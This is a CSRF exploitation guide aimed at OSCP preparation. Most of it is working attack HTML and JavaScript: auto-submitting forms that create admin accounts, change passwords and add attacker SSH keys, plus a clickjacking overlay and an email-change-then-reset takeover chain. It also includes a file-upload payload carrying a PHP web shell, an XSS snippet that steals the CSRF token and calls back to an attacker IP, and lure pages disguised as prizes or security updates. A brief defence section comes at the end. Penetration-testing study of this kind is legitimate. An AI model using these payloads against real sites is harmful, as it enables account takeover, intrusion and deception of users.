# Cross-Site Request Forgery (CSRF) Exploitation Guide

## Table of Contents
1. [CSRF Basics](#csrf-basics)
2. [How CSRF Works](#how-csrf-works)
3. [Detection Techniques](#detection-techniques)
4. [Exploitation Methods](#exploitation-methods)
5. [GET-Based CSRF](#get-based-csrf)
6. [POST-Based CSRF](#post-based-csrf)
7. [Advanced CSRF Techniques](#advanced-csrf-techniques)
8. [CSRF for OSCP](#csrf-for-oscp)
9. [Defense Mechanisms](#defense-mechanisms)

---

## CSRF Basics

### What is CSRF?
Cross-Site Request Forgery tricks authenticated users into performing unwanted actions on a web application where they're currently authenticated.

### Key Requirements for CSRF
1. User is authenticated to target application (has valid session)
2. Application relies solely on session cookies for authentication
3. No CSRF token or other protection mechanism
4. Attacker knows the request structure

### Impact
- Unauthorized fund transfers
- Password changes
- Email address changes
- User creation/deletion (admin context)
- Configuration changes
- Data modification/deletion

---

## How CSRF Works

### Attack Flow
```
1. Victim is logged into vulnerable-site.com
2. Victim visits attacker.com (malicious site)
3. attacker.com contains hidden request to vulnerable-site.com
4. Browser automatically includes vulnerable-site.com cookies
5. Request executes with victim's privileges
```

### Example Scenario
```
Legitimate Request:
POST /admin/adduser HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc123xyz
Content-Type: application/x-www-form-urlencoded

username=newuser&password=pass123&role=admin

CSRF Attack:
Victim visits attacker.com which contains:
<form action="http://vulnerable-site.com/admin/adduser" method="POST">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="password" value="evil123">
    <input type="hidden" name="role" value="admin">
</form>
<script>document.forms[0].submit();</script>

Browser automatically sends victim's session cookie!
```

---

## Detection Techniques

### 1. Identify State-Changing Requests
Look for requests that:
- Create/delete users
- Change passwords
- Modify email addresses
- Transfer funds
- Update settings
- Grant permissions

### 2. Check for CSRF Tokens
```http
POST /admin/adduser HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test&password=test&csrf_token=MISSING  ← No token = vulnerable!
```

### 3. Test with Burp Suite
```
1. Intercept request in Burp
2. Right-click → Engagement Tools → Generate CSRF PoC
3. Test PoC in browser
4. If request succeeds = CSRF vulnerable
```

### 4. Check Referer/Origin Headers
```http
# Vulnerable: No Referer/Origin checking
POST /admin/adduser HTTP/1.1
Host: target.com
Cookie: session=abc123

# Better: Checks Origin (but can be bypassed)
Origin: http://attacker.com  ← Should be rejected
```

---

## Exploitation Methods

### Delivery Methods
1. **Hosted HTML page**: Host malicious HTML on attacker server
2. **Email with HTML**: Send HTML email with embedded form
3. **XSS + CSRF**: Use XSS to execute CSRF from same origin
4. **Image tags**: Simple GET-based CSRF
5. **Hidden iframes**: Silent POST-based CSRF

---

## GET-Based CSRF

### Simple Image Tag CSRF
```html
<!-- Most basic CSRF - works for GET requests -->
<img src="http://vulnerable-site.com/admin/deleteuser?id=123">

<!-- Multiple actions -->
<img src="http://vulnerable-site.com/admin/deleteuser?id=1">
<img src="http://vulnerable-site.com/admin/deleteuser?id=2">
<img src="http://vulnerable-site.com/admin/deleteuser?id=3">
```

### Link-Based CSRF
```html
<a href="http://vulnerable-site.com/admin/adduser?username=hacker&password=evil&role=admin">
    Click here for FREE PRIZE!
</a>

<!-- Auto-redirect -->
<script>
window.location = 'http://vulnerable-site.com/admin/deleteuser?id=123';
</script>
```

### Iframe CSRF (Hidden)
```html
<iframe style="display:none" src="http://vulnerable-site.com/admin/deleteuser?id=123"></iframe>
```

### XMLHttpRequest GET CSRF
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://vulnerable-site.com/admin/deleteuser?id=123', true);
xhr.withCredentials = true;  // Send cookies
xhr.send();
</script>
```

### Complete GET CSRF Example
```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Prize!</title>
</head>
<body>
    <h1>Claim Your Prize</h1>
    <p>Loading...</p>

    <!-- Hidden CSRF attacks -->
    <img src="http://vulnerable-site.com/admin/deleteuser?id=123" style="display:none">
    <img src="http://vulnerable-site.com/admin/adduser?username=hacker&password=evil123&role=admin" style="display:none">

    <script>
    // Redirect after attack
    setTimeout(function() {
        window.location = 'http://legitimate-site.com';
    }, 2000);
    </script>
</body>
</html>
```

---

## POST-Based CSRF

### Auto-Submit Form
```html
<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
</head>
<body>
    <h1>Please wait...</h1>

    <form id="csrf-form" action="http://vulnerable-site.com/admin/adduser" method="POST">
        <input type="hidden" name="username" value="hacker">
        <input type="hidden" name="password" value="evilpass123">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="role" value="admin">
    </form>

    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

### Hidden Iframe Form Submission
```html
<iframe style="display:none" name="csrf-frame"></iframe>

<form action="http://vulnerable-site.com/admin/adduser" method="POST" target="csrf-frame" id="csrf-form">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="password" value="evil123">
    <input type="hidden" name="role" value="admin">
</form>

<script>
    document.getElementById('csrf-form').submit();
</script>
```

### Fetch API POST CSRF
```html
<script>
fetch('http://vulnerable-site.com/admin/adduser', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'username=hacker&password=evil123&role=admin'
});
</script>
```

### XMLHttpRequest POST CSRF
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://vulnerable-site.com/admin/adduser', true);
xhr.withCredentials = true;  // Send cookies
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('username=hacker&password=evil123&role=admin');
</script>
```

### JSON POST CSRF
```html
<script>
fetch('http://vulnerable-site.com/api/admin/adduser', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        username: 'hacker',
        password: 'evil123',
        role: 'admin'
    })
});
</script>
```

### Multi-Part Form Data CSRF
```html
<script>
var formData = new FormData();
formData.append('username', 'hacker');
formData.append('password', 'evil123');
formData.append('role', 'admin');

fetch('http://vulnerable-site.com/admin/adduser', {
    method: 'POST',
    credentials: 'include',
    body: formData
});
</script>
```

---

## Advanced CSRF Techniques

### CSRF Token Bypass - No Token Validation
```html
<!-- If token is optional, just omit it -->
<form action="http://vulnerable-site.com/admin/adduser" method="POST">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="password" value="evil123">
    <!-- No csrf_token field -->
</form>
<script>document.forms[0].submit();</script>
```

### CSRF Token Bypass - Token Not Tied to Session
```html
<!-- Use your own valid token if not tied to session -->
<form action="http://vulnerable-site.com/admin/adduser" method="POST">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="password" value="evil123">
    <input type="hidden" name="csrf_token" value="attacker_valid_token_123">
</form>
<script>document.forms[0].submit();</script>
```

### CSRF Token Bypass - Token in URL Parameter
```html
<!-- If token is in URL instead of POST body, easier to exploit -->
<form action="http://vulnerable-site.com/admin/adduser?csrf_token=STATIC" method="POST">
    <input type="hidden" name="username" value="hacker">
    <input type="hidden" name="password" value="evil123">
</form>
<script>document.forms[0].submit();</script>
```

### CSRF via XSS (Same-Origin)
```html
<!-- If you have XSS, you can extract CSRF token -->
<script>
// Extract token from page
var token = document.querySelector('input[name="csrf_token"]').value;

// Use token in CSRF attack
fetch('/admin/adduser', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'username=hacker&password=evil123&csrf_token=' + token
});
</script>
```

### CSRF with Clickjacking
```html
<!-- Combine CSRF with clickjacking for user interaction -->
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.0001;
        z-index: 1000;
    }
    button {
        position: absolute;
        top: 200px;
        left: 300px;
        z-index: 1;
    }
</style>

<button>Click for Prize!</button>
<iframe src="http://vulnerable-site.com/admin/deleteuser?id=123"></iframe>
```

### CSRF Chain Attack
```html
<script>
// Step 1: Change victim's email to attacker's email
fetch('http://vulnerable-site.com/profile/email', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'email=attacker@evil.com'
}).then(() => {
    // Step 2: Request password reset (goes to attacker's email)
    return fetch('http://vulnerable-site.com/password/reset', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'email=attacker@evil.com'
    });
}).then(() => {
    alert('Check your email for password reset!');
});
</script>
```

### File Upload CSRF
```html
<form action="http://vulnerable-site.com/admin/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="file" value="malicious.php">
    <input type="hidden" name="content" value="<?php system($_GET['cmd']); ?>">
</form>
<script>document.forms[0].submit();</script>
```

---

## CSRF for OSCP

### Common OSCP CSRF Scenarios

#### 1. Admin User Creation
```html
<!DOCTYPE html>
<html>
<head><title>OSCP CSRF - Add Admin</title></head>
<body>
    <h1>Loading...</h1>
    <form id="csrf" action="http://target.com/admin/adduser" method="POST">
        <input type="hidden" name="username" value="oscp">
        <input type="hidden" name="password" value="oscp123">
        <input type="hidden" name="role" value="administrator">
    </form>
    <script>
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

**Attack Steps:**
```bash
1. Host malicious page:
   python3 -m http.server 80

2. Social engineer admin to visit:
   http://10.10.14.5/csrf.html

3. Admin user 'oscp' is created

4. Login with oscp:oscp123 credentials
```

#### 2. Password Change CSRF
```html
<!DOCTYPE html>
<html>
<head><title>Important Update</title></head>
<body>
    <h1>Security Update Required</h1>
    <p>Please wait while we apply security patches...</p>

    <form id="csrf" action="http://target.com/user/changepassword" method="POST">
        <input type="hidden" name="new_password" value="Hacked123!">
        <input type="hidden" name="confirm_password" value="Hacked123!">
    </form>

    <script>
        setTimeout(function() {
            document.getElementById('csrf').submit();
        }, 1000);
    </script>
</body>
</html>
```

#### 3. SSH Key Addition CSRF
```html
<!DOCTYPE html>
<html>
<head><title>CSRF SSH Key</title></head>
<body>
    <form id="csrf" action="http://target.com/admin/ssh-keys/add" method="POST">
        <input type="hidden" name="key" value="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... attacker@kali">
        <input type="hidden" name="username" value="root">
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

#### 4. Configuration Change CSRF
```html
<script>
// Enable remote access
fetch('http://target.com/api/settings', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        remote_access: true,
        allowed_ips: ['0.0.0.0/0'],
        ssh_enabled: true
    })
});
</script>
```

#### 5. Combining XSS + CSRF (OSCP Common)
```html
<!-- Stored XSS payload that performs CSRF -->
<script>
// Extract CSRF token if exists
var token = document.querySelector('input[name="csrf_token"]');
var tokenValue = token ? token.value : '';

// Perform admin action
fetch('/admin/adduser', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'username=hacker&password=Hack123!&role=admin&csrf_token=' + tokenValue
}).then(() => {
    // Exfiltrate confirmation
    fetch('http://10.10.14.5/?success=user_created');
});
</script>
```

---

## CSRF Hunting Checklist

### Testing Workflow
1. **Identify target functionality:**
   - [ ] User management (create/delete/modify)
   - [ ] Password changes
   - [ ] Email changes
   - [ ] Profile updates
   - [ ] Settings modifications
   - [ ] File uploads
   - [ ] API endpoints

2. **Analyze request:**
   - [ ] Check for CSRF token
   - [ ] Check for Origin/Referer validation
   - [ ] Note request method (GET/POST)
   - [ ] Note content-type
   - [ ] Note all parameters

3. **Test protections:**
   - [ ] Remove CSRF token (still works?)
   - [ ] Use invalid token (still works?)
   - [ ] Use another user's token (works?)
   - [ ] Change request method GET ↔ POST
   - [ ] Remove Origin/Referer headers

4. **Create PoC:**
   - [ ] Generate HTML PoC
   - [ ] Test in separate browser
   - [ ] Verify functionality
   - [ ] Document impact

---

## Burp Suite CSRF PoC Generation

### Using Burp to Generate CSRF PoC
```
1. Intercept target request in Burp Proxy
2. Send to Repeater
3. Right-click → Engagement Tools → Generate CSRF PoC
4. Options:
   - Auto-submit form
   - Include URL in form action
   - Include body as hidden inputs
5. Click "Regenerate"
6. Copy HTML and save to file
7. Test PoC
```

### Example Burp-Generated PoC
```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://vulnerable-site.com/admin/adduser" method="POST">
      <input type="hidden" name="username" value="hacker" />
      <input type="hidden" name="password" value="evil123" />
      <input type="hidden" name="email" value="hacker&#64;evil&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Defense Mechanisms

### CSRF Tokens (Proper Implementation)
```php
// Generate token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Include in form
<input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">

// Validate
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

### SameSite Cookie Attribute
```
Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax
```

### Origin/Referer Validation
```php
$allowed_origins = ['https://trusted-site.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (!in_array($origin, $allowed_origins)) {
    die('Invalid origin');
}
```

### Double Submit Cookie
```javascript
// Set CSRF token in cookie AND form
document.cookie = "csrf_token=" + token;
// Compare both on server side
```

---

## Tools

### CSRF Testing Tools
```bash
# CSRFTester
java -jar CSRFTester.jar

# Burp Suite Pro
- CSRF PoC Generator
- CSRF Scanner

# OWASP ZAP
- Active Scan CSRF detection

# Manual testing (most reliable for OSCP)
```

---

## Quick Reference

### GET-Based CSRF One-Liner
```html
<img src="http://target.com/admin/action?param=value">
```

### POST-Based CSRF One-Liner
```html
<body onload="document.forms[0].submit()">
<form action="http://target.com/admin/action" method="POST">
<input type="hidden" name="param" value="value">
</form>
```

### CSRF via JavaScript
```html
<script>
fetch('http://target.com/admin/action', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'param=value'
});
</script>
```

---

## OSCP Exam Tips

1. **Look for admin panels** with no CSRF protection
2. **Combine with XSS** for same-origin CSRF token extraction
3. **Test GET requests** - easiest to exploit
4. **Use Burp's CSRF PoC generator** for quick testing
5. **Social engineering** may be required to get admin to visit your page
6. **Document carefully** - CSRF requires careful explanation in report

---

**Remember**: CSRF is powerful when combined with social engineering or XSS. Always test with proper authorization!
